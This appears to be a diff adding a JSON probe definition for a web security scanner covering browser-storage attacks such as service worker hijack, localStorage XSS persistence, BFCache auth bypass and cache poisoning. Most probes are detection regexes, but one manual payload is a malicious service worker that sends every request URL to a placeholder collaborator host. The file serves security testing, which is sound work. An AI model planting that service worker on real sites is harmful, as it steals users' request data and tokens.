@@ -1,0 +1,152 @@
+{
+  "category": "browser_storage",
+  "description": "Browser-side storage attacks — localStorage XSS persistence, ServiceWorker hijack, IndexedDB tampering, BFCache (back-forward cache) auth bypass, quota-exceeded fallback. These are CLIENT-SIDE bugs but reportable when chained or when the app trusts client-stored data.",
+  "craft_guidance": [
+    "1. INVENTORY: open DevTools -> Application tab. Note localStorage / sessionStorage / IndexedDB stores / Service Workers / Cache Storage.",
+    "2. TRUST BOUNDARIES: which client-stored values does the app TRUST? auth tokens, role, csrf seeds, feature flags, config URLs.",
+    "3. WRITE PRIMITIVES: what allows writing storage? Reflected XSS, stored XSS, postMessage handler, location.hash parser, OAuth state parameter.",
+    "4. PERSISTENCE: localStorage / IndexedDB persist. Service Workers persist + intercept. Cache Storage persists + serves intercepted requests.",
+    "5. SERVICE WORKER FETCH HIJACK: if attacker registers /sw.js (via stored XSS or path-traversal upload), SW intercepts ALL same-origin requests for ~24h.",
+    "6. BFCACHE: back-button restores tabs WITHOUT re-running auth checks. If app sets sensitive state on render, victim's back-button into logged-in state after logout.",
+    "7. STORAGE EVENT XSS: localStorage 'storage' event fires across tabs. Poisoned localStorage executes when victim opens another tab.",
+    "8. INDEXEDDB: structured storage; many apps use it as cache for API responses. Tampering = serve poisoned content from local cache.",
+    "9. QUOTA DOS: fill localStorage to quota; some apps fall back to in-memory or sync XHR (DoS).",
+    "10. PARTITION: top-level vs. third-party iframe storage. CHIPS / partitioned cookies don't apply to storage; iframe attacks may share storage with parent."
+  ],
+  "contexts": {
+    "service_worker_hijack": {
+      "description": "Register attacker-controlled /sw.js (via stored XSS, file upload to webroot, or path traversal) — Service Worker intercepts all subsequent same-origin requests including those that contain auth tokens.",
+      "tech_match": ["service_worker", "spa"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Check if /sw.js is reachable + cacheable. If 200 + cache-control allows long TTL, hijack window is large.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["self.addEventListener", "fetch", "install"]}
+          ],
+          "severity": "low",
+          "confidence_boost": 25
+        },
+        {
+          "payload": "self.addEventListener('fetch',e=>{e.respondWith(fetch('https://COLLABORATOR/?u='+encodeURIComponent(e.request.url)).then(()=>fetch(e.request)));});",
+          "description": "[Manual] If you have a write primitive at /sw.js, this SW exfiltrates every request URL to Collaborator while still serving the response. Replace COLLABORATOR.",
+          "matchers": [
+            {"type": "word", "any": ["addEventListener", "fetch"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {"COLLAB_REQUIRED": true, "manual_chain": true}
+        }
+      ]
+    },
+    "localstorage_xss_persistence": {
+      "description": "XSS payload stored in localStorage; victim revisits in a new tab; payload re-executes from storage. Persists across page reloads even if the original XSS sink is patched.",
+      "tech_match": ["spa"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Check whether app reads JSON from localStorage and renders without sanitization. Search response JS for `JSON.parse(localStorage.getItem(`.",
+          "matchers": [
+            {"type": "regex", "pattern": "JSON\\.parse\\s*\\(\\s*localStorage"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "Search for `innerHTML\\s*=\\s*localStorage` or template-render with localStorage value as input. These are XSS sinks where the payload survives reload.",
+          "matchers": [
+            {"type": "regex", "pattern": "innerHTML\\s*=\\s*[^;]*localStorage"}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "indexeddb_tampering": {
+      "description": "Apps that cache API responses in IndexedDB and serve the cached content for offline mode are vulnerable to IndexedDB tampering. Attacker writes crafted record; app loads and trusts.",
+      "tech_match": ["pwa", "offline"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Detect IndexedDB usage. Search response JS for `indexedDB.open` and identify the schema (database / object store names).",
+          "matchers": [
+            {"type": "word", "any": ["indexedDB.open", "IDBObjectStore", "createObjectStore"]}
+          ],
+          "severity": "low",
+          "confidence_boost": 25
+        }
+      ]
+    },
+    "bfcache_auth_bypass": {
+      "description": "Browsers cache full page state in BFCache. After logout, back-button restores the in-memory authenticated state including JS variables holding tokens. Server-side auth check on next request may pass if cookies survive (HttpOnly) or fail silently.",
+      "tech_match": ["spa"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Check Cache-Control on logout response. If it doesn't include `no-store`, BFCache may restore the authenticated page after back navigation.",
+          "matchers": [
+            {"type": "header", "name": "Cache-Control", "contains": ""},
+            {"type": "not_word", "words": ["no-store"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35,
+          "variables": {"endpoint_hint": "/logout"}
+        }
+      ]
+    },
+    "cache_storage_poisoning": {
+      "description": "Service Worker often pre-caches assets via Cache Storage. Attacker who controls a CDN, MITM, or an upstream resource can poison cached entries and persist across sessions.",
+      "tech_match": ["service_worker", "pwa"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Inspect SW for cache.put with non-cors-validated origins. Search for `caches.open(...).then(c=>c.put(req, response))` patterns where response origin isn't validated.",
+          "matchers": [
+            {"type": "regex", "pattern": "caches\\.(open|put)"}
+          ],
+          "severity": "low",
+          "confidence_boost": 25
+        }
+      ]
+    },
+    "storage_event_cross_tab": {
+      "description": "localStorage 'storage' event fires in OTHER tabs sharing the origin. Attacker tab writes payload; victim tab on same origin reads + executes via storage handler.",
+      "tech_match": ["spa"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Search for `addEventListener('storage'` handlers that pass values to innerHTML/eval/Function.",
+          "matchers": [
+            {"type": "regex", "pattern": "addEventListener\\s*\\(\\s*['\\\"]storage['\\\"]"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "quota_exceeded_fallback": {
+      "description": "App falls back to insecure storage (in-memory variable, document.cookie) when localStorage is full. Attacker fills quota then attacker iframe can read fallback storage.",
+      "tech_match": ["spa"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Search response JS for try/catch around `localStorage.setItem` with cookie/in-memory fallback.",
+          "matchers": [
+            {"type": "regex", "pattern": "QuotaExceeded|setItem.*catch"}
+          ],
+          "severity": "low",
+          "confidence_boost": 25
+        }
+      ]
+    }
+  }
+}
